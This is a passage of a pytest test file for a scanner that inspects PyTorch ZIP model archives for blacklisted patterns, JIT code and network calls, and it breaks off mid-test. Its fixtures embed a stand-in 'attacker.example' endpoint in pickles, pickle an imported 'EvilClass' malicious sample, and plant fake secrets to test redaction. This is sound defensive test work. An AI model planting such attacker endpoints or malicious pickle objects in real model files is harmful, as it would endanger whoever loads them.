def test_pytorch_zip_scanner_invalid_zip(tmp_path):
    """Test scanning an invalid ZIP file."""
    # Create an invalid ZIP file
    invalid_path = tmp_path / "invalid.pt"
    invalid_path.write_bytes(b"This is not a valid ZIP file")

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(invalid_path))

    # Should have an error about invalid ZIP
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any(
        "invalid" in issue.message.lower() or "corrupt" in issue.message.lower() or "error" in issue.message.lower()
        for issue in result.issues
    )


def test_pytorch_zip_scanner_corrupt_pk_zip_keeps_s902(tmp_path: Path) -> None:
    invalid_path = tmp_path / "corrupt-central-directory.pt"
    invalid_path.write_bytes(b"PK\x03\x04truncated-local-header")

    result = PyTorchZipScanner().scan(str(invalid_path))
    format_checks = [check for check in result.checks if check.name == "PyTorch ZIP Format Validation"]

    assert result.success is False
    assert len(format_checks) == 1
    assert format_checks[0].status == CheckStatus.FAILED
    assert format_checks[0].severity == IssueSeverity.CRITICAL
    assert format_checks[0].rule_code == "S902"
    assert format_checks[0].message == f"Not a valid zip file: {invalid_path}"


def test_pytorch_zip_scanner_missing_data_pkl(tmp_path):
    """Test scanning a PyTorch ZIP file without data.pkl."""
    # Create a ZIP file without data.pkl
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("model.json", '{"name": "test_model"}')

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    # Should have a warning about missing data.pkl
    assert any("data.pkl" in issue.message for issue in result.issues)


def test_pytorch_zip_scanner_with_blacklist(tmp_path):
    """Test PyTorch ZIP scanner with custom blacklist patterns."""
    # Create a ZIP file with content that matches our blacklist
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")

        # Create data with a string that will match our blacklist
        data = {"weights": [1, 2, 3], "custom_function": "suspicious_function"}
        pickled_data = pickle.dumps(data)
        zipf.writestr("data.pkl", pickled_data)

    # Create scanner with custom blacklist
    scanner = PyTorchZipScanner(config={"blacklist_patterns": ["suspicious_function"]})
    result = scanner.scan(str(zip_path))

    # Should detect our blacklisted pattern
    blacklist_issues = [issue for issue in result.issues if "suspicious_function" in issue.message.lower()]
    assert len(blacklist_issues) > 0


def _assert_blacklist_inconclusive_not_cached(
    path: Path,
    cache_dir: Path,
    reason: str,
    **scan_kwargs: Any,
) -> None:
    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
            **scan_kwargs,
        )
        second = scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
            **scan_kwargs,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(path)]
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert reason in metadata["scan_outcome_reasons"]
            assert not [
                issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
            ]
            assert determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_pytorch_zip_oversized_blacklist_member_is_inconclusive(tmp_path: Path) -> None:
    """Configured blacklist coverage must not pass when a matching member is skipped."""
    zip_path = create_mock_pytorch_zip(tmp_path / "blocked_oversized.pt", data={})
    with zipfile.ZipFile(zip_path, "a") as zip_file:
        zip_file.writestr("notes.txt", b"A" * 48 + b"BLOCKED_PATTERN")

    config = {"blacklist_patterns": ["BLOCKED_PATTERN"], "max_blacklist_scan_size": 32}
    result = PyTorchZipScanner(config=config).scan(str(zip_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == [
        PyTorchZipScanner.BLACKLIST_SIZE_LIMIT_INCONCLUSIVE_REASON,
    ]
    limit_checks = [
        check
        for check in result.checks
        if check.name == "Blacklist Pattern Check" and check.details.get("zip_entry") == "notes.txt"
    ]
    assert len(limit_checks) == 1
    assert limit_checks[0].status == CheckStatus.FAILED
    assert limit_checks[0].severity == IssueSeverity.INFO
    assert limit_checks[0].details["analysis_incomplete"] is True
    assert not any("BLOCKED_PATTERN" in issue.message for issue in result.issues)

    _assert_blacklist_inconclusive_not_cached(
        zip_path,
        tmp_path / "oversized-hidden-cache",
        PyTorchZipScanner.BLACKLIST_SIZE_LIMIT_INCONCLUSIVE_REASON,
        blacklist_patterns=["BLOCKED_PATTERN"],
        max_blacklist_scan_size=32,
    )


def test_pytorch_zip_oversized_benign_blacklist_member_is_inconclusive_without_finding(tmp_path: Path) -> None:
    """A benign skipped member is incomplete coverage, not a claimed blacklist match."""
    zip_path = create_mock_pytorch_zip(tmp_path / "benign_oversized.pt", data={})
    with zipfile.ZipFile(zip_path, "a") as zip_file:
        zip_file.writestr("notes.txt", b"A" * 48 + b"ordinary")

    result = PyTorchZipScanner(
        config={"blacklist_patterns": ["BLOCKED_PATTERN"], "max_blacklist_scan_size": 32},
    ).scan(str(zip_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == [
        PyTorchZipScanner.BLACKLIST_SIZE_LIMIT_INCONCLUSIVE_REASON,
    ]
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)

    _assert_blacklist_inconclusive_not_cached(
        zip_path,
        tmp_path / "oversized-benign-cache",
        PyTorchZipScanner.BLACKLIST_SIZE_LIMIT_INCONCLUSIVE_REASON,
        blacklist_patterns=["BLOCKED_PATTERN"],
        max_blacklist_scan_size=32,
    )


def test_pytorch_zip_blacklist_member_read_failure_is_inconclusive_and_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    zip_path = create_mock_pytorch_zip(tmp_path / "unreadable_blacklist.pt", data={})
    with zipfile.ZipFile(zip_path, "a") as zip_file:
        zip_file.writestr("notes.txt", b"ordinary")

    original_read_member_bytes = PyTorchZipScanner._read_member_bytes

    def fail_blacklist_member_read(
        self: PyTorchZipScanner,
        zip_file: zipfile.ZipFile,
        name: str | zipfile.ZipInfo,
        *,
        phase: str,
        result: ScanResult,
        max_bytes: int | None = None,
    ) -> bytes:
        if phase == "blacklist_check" and self._get_zip_member_name(name) == "notes.txt":
            raise OSError("member read failed")
        return original_read_member_bytes(self, zip_file, name, phase=phase, result=result, max_bytes=max_bytes)

    monkeypatch.setattr(PyTorchZipScanner, "_read_member_bytes", fail_blacklist_member_read)

    result = PyTorchZipScanner(config={"blacklist_patterns": ["BLOCKED_PATTERN"]}).scan(str(zip_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == [
        PyTorchZipScanner.BLACKLIST_READ_INCONCLUSIVE_REASON,
    ]
    read_checks = [
        check
        for check in result.checks
        if check.name == "ZIP Entry Read" and check.details.get("zip_entry") == "notes.txt"
    ]
    assert len(read_checks) == 1
    assert read_checks[0].severity == IssueSeverity.INFO
    assert read_checks[0].details["analysis_incomplete"] is True
    assert read_checks[0].details["scan_outcome_reason"] == PyTorchZipScanner.BLACKLIST_READ_INCONCLUSIVE_REASON

    _assert_blacklist_inconclusive_not_cached(
        zip_path,
        tmp_path / "blacklist-read-failure-cache",
        PyTorchZipScanner.BLACKLIST_READ_INCONCLUSIVE_REASON,
        blacklist_patterns=["BLOCKED_PATTERN"],
    )


def test_pytorch_zip_blacklist_pattern_at_size_limit_is_detected(tmp_path: Path) -> None:
    """A member within the configured blacklist window must remain actively inspected."""
    zip_path = create_mock_pytorch_zip(tmp_path / "bounded_pattern.pt", data={})
    payload = b"A" * 48 + b"BLOCKED_PATTERN"
    with zipfile.ZipFile(zip_path, "a") as zip_file:
        zip_file.writestr("notes.txt", payload)

    result = PyTorchZipScanner(
        config={"blacklist_patterns": ["BLOCKED_PATTERN"], "max_blacklist_scan_size": len(payload)},
    ).scan(str(zip_path))

    assert "scan_outcome" not in result.metadata
    assert any(
        issue.severity == IssueSeverity.CRITICAL and "BLOCKED_PATTERN" in issue.message for issue in result.issues
    )

    aggregate = scan_model_directory_or_file(
        str(zip_path),
        blacklist_patterns=["BLOCKED_PATTERN"],
        max_blacklist_scan_size=len(payload),
        cache_enabled=False,
    )
    assert determine_exit_code(aggregate) == 1


def test_pytorch_pickle_file_unsupported(tmp_path):
    """Raw pickle files with .pt extension should be unsupported."""
    from tests.assets.generators.generate_evil_pickle import EvilClass

    file_path = tmp_path / "raw_pickle.pt"
    with file_path.open("wb") as f:
        pickle.dump(EvilClass(), f)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(file_path))

    assert result.success is False
    assert any("zip" in issue.message.lower() or "pytorch" in issue.message.lower() for issue in result.issues)


def test_pytorch_zip_scanner_closes_bytesio(tmp_path, monkeypatch):
    """Ensure BytesIO objects are properly closed after scanning."""
    import io

    closed = {}

    class TrackedBytesIO(io.BytesIO):
        def close(self) -> None:
            closed["closed"] = True
            super().close()

    monkeypatch.setattr(io, "BytesIO", TrackedBytesIO)

    model_path = create_mock_pytorch_zip(tmp_path / "model.pt")
    scanner = PyTorchZipScanner()
    scanner.scan(str(model_path))

    assert closed.get("closed") is True


def test_pytorch_zip_initialize_scan_does_not_read_archive_members(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Regression test for stale duplicate scan logic in _initialize_scan()."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/0", b"\x00" * 1024)

    archive_reads: list[str] = []

    def fail_read(
        self: zipfile.ZipFile,
        name: str | zipfile.ZipInfo,
        pwd: bytes | None = None,
    ) -> bytes:
        archive_reads.append(name.filename if isinstance(name, zipfile.ZipInfo) else str(name))
        raise AssertionError("_initialize_scan() should not read archive member payloads")

    def fail_open(
        self: zipfile.ZipFile,
        name: str | zipfile.ZipInfo,
        mode: str = "r",
        pwd: bytes | None = None,
        *,
        force_zip64: bool = False,
    ) -> IO[bytes]:
        archive_reads.append(name.filename if isinstance(name, zipfile.ZipInfo) else str(name))
        raise AssertionError("_initialize_scan() should not open archive member payloads")

    def fail_namelist(self: zipfile.ZipFile) -> list[str]:
        raise AssertionError("_initialize_scan() should not materialize all archive member names")

    def fail_zip_file(*args: Any, **kwargs: Any) -> None:
        del args, kwargs
        raise AssertionError("_initialize_scan() should not parse the ZIP central directory")

    monkeypatch.setattr(zipfile.ZipFile, "read", fail_read)
    monkeypatch.setattr(zipfile.ZipFile, "open", fail_open)
    monkeypatch.setattr(zipfile.ZipFile, "namelist", fail_namelist)
    monkeypatch.setattr(zipfile, "ZipFile", fail_zip_file)

    scanner = PyTorchZipScanner()
    result = scanner._initialize_scan(str(zip_path))

    assert result.success is True
    assert archive_reads == []
    assert "pickle_files" not in result.metadata


def test_pytorch_zip_scan_does_not_route_numeric_tensor_data_files_as_pickles(tmp_path: Path) -> None:
    """Numeric tensor payloads should be prefix-probed but not routed as pickles."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/0", b"\x00" * 1024)
        zipf.writestr("archive/data/1", b"\x00" * 1024)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    assert result.success is True
    assert result.metadata["pickle_files"] == ["archive/data.pkl"]
    assert not any(
        issue.details.get("pickle_filename") in {"archive/data/0", "archive/data/1"} for issue in result.issues
    )


def test_pytorch_zip_scanner_handles_zip_metadata_oserror(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Non-BadZipFile metadata failures are incomplete coverage, not findings."""
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt")

    def fail_infolist(self: zipfile.ZipFile) -> list[zipfile.ZipInfo]:
        raise OSError("zip metadata unavailable")

    monkeypatch.setattr(zipfile.ZipFile, "infolist", fail_infolist)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(model_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == [PyTorchZipScanner.SCAN_INCONCLUSIVE_REASON]
    assert any("zip metadata unavailable" in check.message for check in result.checks)
    assert not [issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}]


def test_pytorch_zip_scan_failure_is_inconclusive_and_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    zip_path = create_mock_pytorch_zip(tmp_path / "interrupted.pt", data={})
    cache_dir = tmp_path / "scan-failure-cache"

    def fail_discovery(
        self: PyTorchZipScanner,
        zip_file: zipfile.ZipFile,
        safe_entries: list[zipfile.ZipInfo],
        result: ScanResult,
    ) -> list[zipfile.ZipInfo]:
        raise OSError("pickle discovery unavailable")

    monkeypatch.setattr(PyTorchZipScanner, "_discover_pickle_files", fail_discovery)

    reset_cache_manager()
    try:
        for _ in range(2):
            aggregate = scan_model_directory_or_file(
                str(zip_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            metadata = aggregate.file_metadata[str(zip_path)]
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert PyTorchZipScanner.SCAN_INCONCLUSIVE_REASON in metadata["scan_outcome_reasons"]
            assert determine_exit_code(aggregate) == 2
            assert not [
                issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
            ]
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_pytorch_zip_scan_failure_preserves_prior_malicious_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    zip_path = create_mock_pytorch_zip(tmp_path / "malicious_interrupted.pt", malicious=True)

    def fail_jit_scan(
        self: PyTorchZipScanner,
        zip_file: zipfile.ZipFile,
        safe_entries: list[zipfile.ZipInfo],
        result: ScanResult,
        path: str,
    ) -> int:
        raise OSError("jit scan unavailable")

    monkeypatch.setattr(PyTorchZipScanner, "_scan_for_jit_patterns", fail_jit_scan)

    direct = PyTorchZipScanner().scan(str(zip_path))
    aggregate = scan_model_directory_or_file(str(zip_path), cache_enabled=False)

    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert any(issue.severity == IssueSeverity.CRITICAL and "eval" in issue.message.lower() for issue in direct.issues)
    assert any(check.name == "PyTorch ZIP Scan" and check.severity == IssueSeverity.INFO for check in direct.checks)
    assert any(
        issue.severity == IssueSeverity.CRITICAL and "eval" in issue.message.lower() for issue in aggregate.issues
    )
    assert determine_exit_code(aggregate) == 1


def test_pytorch_zip_timeout_marks_inconclusive(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "timeout.pt")

    result = PyTorchZipScanner(config={"timeout": -1}).scan(str(model_path))

    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_scan_timeout" in result.metadata["scan_outcome_reasons"]
    timeout_checks = [check for check in result.checks if check.name == "Scan Timeout"]
    assert len(timeout_checks) == 1
    assert timeout_checks[0].severity == IssueSeverity.INFO


def test_pytorch_zip_jit_scan_size_limit_marks_inconclusive(tmp_path: Path) -> None:
    model_path = tmp_path / "large_jit_member.pt"
    leaked_member_secret = "OVERSIZE-MEMBER-SECRET-123456"
    sensitive_member = f"archive/code/api_key={leaked_member_secret}.txt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zip_file.writestr("archive/code/debug/source.py", b"print('hello')\n")
        zip_file.writestr(sensitive_member, b"print('oversize secret member')\n")

    result = PyTorchZipScanner(config={"max_jit_scan_member_bytes": 4}).scan(str(model_path))

    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_jit_member_size_limit" in result.metadata["scan_outcome_reasons"]
    size_checks = [check for check in result.checks if check.name == "JIT/Network Scan Size Limit"]
    # Aggregation: many oversize members should surface as a single summary
    # check with a `details["zip_entries"]` list, not one INFO per member.
    assert len(size_checks) == 1
    assert size_checks[0].severity == IssueSeverity.INFO
    assert "archive/code/debug/source.py" in size_checks[0].details["zip_entries"]
    assert "archive/byteorder" in size_checks[0].details["zip_entries"]
    assert leaked_member_secret not in result.to_json()
    assert any("<redacted>" in entry for entry in size_checks[0].details["zip_entries"])
    assert size_checks[0].details["skipped_count"] == len(size_checks[0].details["zip_entries"])
    assert size_checks[0].details["analysis_incomplete"] is True
    assert size_checks[0].details["max_scan_bytes"] == 4
    assert not any(
        check.status == CheckStatus.PASSED
        and check.name in {"JIT/Script Code Execution Detection", "Network Communication Detection"}
        and check.location == str(model_path)
        for check in result.checks
    )


def test_pytorch_zip_jit_detector_byte_budget_marks_inconclusive(tmp_path: Path) -> None:
    model_path = tmp_path / "late_jit_payload.pt"
    padding = b"# pad\n" * ((jit_script_module._EMBEDDED_PYTHON_EXTRACT_BYTE_LIMIT // len(b"# pad\n")) + 1)
    late_payload = padding + b"def payload():\n    return 1\n"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zip_file.writestr("archive/code/debug/source.py", late_payload)

    result = PyTorchZipScanner().scan(str(model_path))
    aggregate = scan_model_directory_or_file(str(model_path), cache_enabled=False)

    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert jit_script_module._EMBEDDED_PYTHON_BYTE_LIMIT_REASON in result.metadata["scan_outcome_reasons"]
    jit_checks = [check for check in result.checks if check.name == "JIT/Script Code Execution Detection"]
    assert any(
        check.details.get("details", {}).get("reason") == jit_script_module._EMBEDDED_PYTHON_BYTE_LIMIT_REASON
        for check in jit_checks
    )
    assert getattr(aggregate.file_metadata[str(model_path)], "scan_outcome", None) == INCONCLUSIVE_SCAN_OUTCOME
    assert determine_exit_code(aggregate) == 1


def test_pytorch_zip_jit_scan_read_failure_marks_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "unreadable_jit_member.pt"
    leaked_member_secret = "MEMBER-READ-SECRET-123456"
    leaked_error_secret = "READ-ERROR-SECRET-123456"
    sensitive_member = f"archive/code/debug/api_key={leaked_member_secret}.txt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zip_file.writestr(sensitive_member, b"print('hello')\n")

    original_read_member_bytes = PyTorchZipScanner._read_member_bytes

    def fail_jit_member_read(
        self: PyTorchZipScanner,
        zip_file: zipfile.ZipFile,
        name: str | zipfile.ZipInfo,
        *,
        phase: str,
        result: ScanResult,
        max_bytes: int | None = None,
    ) -> bytes:
        if phase == "jit_script_scan" and self._get_zip_member_name(name) == sensitive_member:
            raise OSError(f"member read failed: {leaked_error_secret}")
        return original_read_member_bytes(self, zip_file, name, phase=phase, result=result, max_bytes=max_bytes)

    monkeypatch.setattr(PyTorchZipScanner, "_read_member_bytes", fail_jit_member_read)

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert "pytorch_zip_jit_member_read_failed" in result.metadata["scan_outcome_reasons"]
    read_failure_checks = [check for check in result.checks if check.name == "JIT/Network Scan Read Failure"]
    # Aggregation: per-member exception details live under `details["entries"]`
    # so even a flood of unreadable members surfaces as a single summary.
    assert len(read_failure_checks) == 1
    details = read_failure_checks[0].details
    assert details["failed_count"] == 1
    assert details["entries"][0]["exception_type"] == "OSError"
    assert details["entries"][0]["exception"] == "<redacted>"
    assert leaked_member_secret not in result.to_json()
    assert leaked_error_secret not in result.to_json()
    assert "<redacted>" in details["zip_entries"][0]
    assert not any(
        check.status == CheckStatus.PASSED
        and check.name in {"JIT/Script Code Execution Detection", "Network Communication Detection"}
        and check.location == str(model_path)
        for check in result.checks
    )


def test_pytorch_zip_jit_scan_aggregates_many_oversize_members_into_one_check(
    tmp_path: Path,
) -> None:
    """Adversarial archives with many oversize members must not flood the checks list."""
    model_path = tmp_path / "many_large_jit_members.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        for index in range(25):
            zip_file.writestr(f"archive/code/debug/src{index}.py", b"print('hello world ')\n")

    result = PyTorchZipScanner(config={"max_jit_scan_member_bytes": 4}).scan(str(model_path))

    size_checks = [check for check in result.checks if check.name == "JIT/Network Scan Size Limit"]
    assert len(size_checks) == 1
    entries = size_checks[0].details["zip_entries"]
    assert len(entries) == 27  # 25 generated sources + byteorder + data.pkl
    assert size_checks[0].details["skipped_count"] == 27
    assert all(entry["file_size"] > 4 for entry in size_checks[0].details["entries"])
    # `scan_outcome_reasons` must be deduplicated even though many members tripped it.
    reasons = result.metadata.get("scan_outcome_reasons", [])
    assert reasons.count("pytorch_zip_jit_member_size_limit") == 1


def test_pytorch_zip_jit_size_limit_respects_disabled_checks(tmp_path: Path) -> None:
    model_path = tmp_path / "large_disabled_jit_member.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zip_file.writestr("archive/code/debug/source.py", b"print('hello')\n")

    result = PyTorchZipScanner(
        config={"check_jit_script": False, "check_network_comm": False, "max_jit_scan_member_bytes": 4}
    ).scan(str(model_path))

    assert result.success is True
    assert "scan_outcome" not in result.metadata
    assert "analysis_incomplete" not in result.metadata
    assert not any(check.name == "JIT/Network Scan Size Limit" for check in result.checks)
    assert result.metadata["disabled_checks"] == [
        "JIT/Script Code Execution Detection",
        "Network Communication Detection",
    ]


def test_pytorch_zip_scans_pickle_members_for_network_when_pickle_scanner_disabled(tmp_path: Path) -> None:
    model_path = tmp_path / "network_in_data_pkl.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr(
            "archive/data.pkl",
            pickle.dumps({"endpoint": "http://attacker.example/model"}, protocol=4),
        )

    result = PyTorchZipScanner(config={"scanners": ["pytorch_zip"]}).scan(str(model_path))

    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "pickle"
        for check in result.checks
    )
    network_failures = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
    ]
    assert network_failures
    assert any(check.location == f"{model_path}:archive/data.pkl" for check in network_failures)


def test_pytorch_zip_scans_pickle_members_past_pickle_raw_window(tmp_path: Path) -> None:
    model_path = tmp_path / "padded_network_in_data_pkl.pt"
    payload = pickle.dumps(
        {
            "padding": "A" * 512,
            "endpoint": "http://attacker.example/model",
        },
        protocol=4,
    )
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", payload)

    result = PyTorchZipScanner(
        config={
            "pickle_root_raw_scan_limit_bytes": 64,
            "pickle_expensive_raw_scan_limit_bytes": 64,
            "max_jit_scan_member_bytes": len(payload) + 1,
        }
    ).scan(str(model_path))

    network_failures = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
    ]
    assert network_failures
    assert any(check.location == f"{model_path}:archive/data.pkl" for check in network_failures)


@pytest.mark.parametrize(
    ("detector_path", "detector_name", "clean_check_name"),
    [
        (
            "modelaudit.detectors.jit_script.JITScriptDetector.scan_model",
            "jit_script",
            "JIT/Script Code Execution Detection",
        ),
        (
            "modelaudit.detectors.network_comm.NetworkCommDetector.scan",
            "network_communication",
            "Network Communication Detection",
        ),
    ],
)
def test_pytorch_zip_raw_detector_exception_marks_scan_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    caplog: pytest.LogCaptureFixture,
    detector_path: str,
    detector_name: str,
    clean_check_name: str,
) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / f"{detector_name}-error.pt", prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/code/endpoint.txt", "https://attacker.example/model")
    leaked_secret = f"UNSTRUCTURED-{detector_name.upper()}-SECRET-123456"

    def raise_detector_error(*_args: object, **_kwargs: object) -> list[dict[str, object]]:
        raise RuntimeError(f"detector rejected {leaked_secret}")

    monkeypatch.setattr(detector_path, raise_detector_error)

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "raw_detector_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    coverage_checks = [
        check
        for check in result.checks
        if check.name == "Raw Detector Analysis Coverage" and check.details.get("detector") == detector_name
    ]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].details["analysis_incomplete"] is True
    assert leaked_secret not in str(result.metadata)
    assert leaked_secret not in str(coverage_checks[0].details)
    assert leaked_secret not in caplog.text
    assert not any(
        check.name == clean_check_name and check.status == CheckStatus.PASSED and check.location == str(model_path)
        for check in result.checks
    )


def test_pytorch_zip_preserves_raw_detector_failures_across_pickle_members(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Merging pickle members must retain every failed detector and remove false passes."""
    model_path = tmp_path / "multi-pickle-detector-errors.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"member": "first"}, protocol=4))
        zip_file.writestr("archive/extra.pkl", pickle.dumps({"member": "second"}, protocol=4))

    original_jit_scan = jit_script_module.JITScriptDetector.scan_model
    original_network_scan = network_comm_module.NetworkCommDetector.scan

    def selective_jit_failure(
        detector: jit_script_module.JITScriptDetector,
        data: bytes,
        model_type: str,
        context: str,
    ) -> list[Any]:
        if context.endswith("archive/data.pkl"):
            raise RuntimeError("first pickle JIT failure")
        return original_jit_scan(detector, data, model_type, context)

    def selective_network_failure(
        detector: network_comm_module.NetworkCommDetector,
        data: bytes,
        context: str,
    ) -> list[Any]:
        if context.endswith("archive/extra.pkl"):
            raise RuntimeError("second pickle network failure")
        return original_network_scan(detector, data, context)

    monkeypatch.setattr(jit_script_module.JITScriptDetector, "scan_model", selective_jit_failure)
    monkeypatch.setattr(network_comm_module.NetworkCommDetector, "scan", selective_network_failure)

    result = PyTorchZipScanner(config={"max_jit_scan_member_bytes": 0}).scan(str(model_path))

    assert result.success is False
    assert result.metadata["raw_detector_failed_detectors"] == [
        "jit_script",
        "network_communication",
    ]
    assert {failure["detector"] for failure in result.metadata["raw_detector_analysis_failures"]} == {
        "jit_script",
        "network_communication",
    }
    assert not any(
        check.status == CheckStatus.PASSED
        and check.name in {"JIT/Script Code Execution Detection", "Network Communication Detection"}
        for check in result.checks
    )


def test_pytorch_zip_deferred_network_detector_exception_is_redacted_and_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    caplog: pytest.LogCaptureFixture,
) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "deferred-network-error.pt", prefix="archive")
    leaked_secret = "DEFERRED-NETWORK-SECRET-123456"
    leaked_member_secret = "MEMBER-NAME-SECRET-123456"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(f"archive/code/api_key={leaked_member_secret}.txt", "network detector input")

    def deferred_detector_error(*_args: object, **_kwargs: object) -> Iterator[dict[str, object]]:
        def findings() -> Iterator[dict[str, object]]:
            yield from ()
            raise RuntimeError(f"network detector rejected {leaked_secret}")

        return findings()

    monkeypatch.setattr("modelaudit.detectors.network_comm.NetworkCommDetector.scan", deferred_detector_error)

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "raw_detector_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "pytorch_zip_jit_member_read_failed" not in result.metadata["scan_outcome_reasons"]
    assert leaked_secret not in result.to_json()
    assert leaked_member_secret not in result.to_json()
    assert leaked_secret not in caplog.text
    assert leaked_member_secret not in caplog.text
    assert any(
        check.name == "Raw Detector Analysis Coverage"
        and check.details.get("detector") == "network_communication"
        and check.details.get("exception") == "<redacted>"
        for check in result.checks
    )
    assert not any(
        check.name == "Network Communication Detection" and check.status == CheckStatus.PASSED
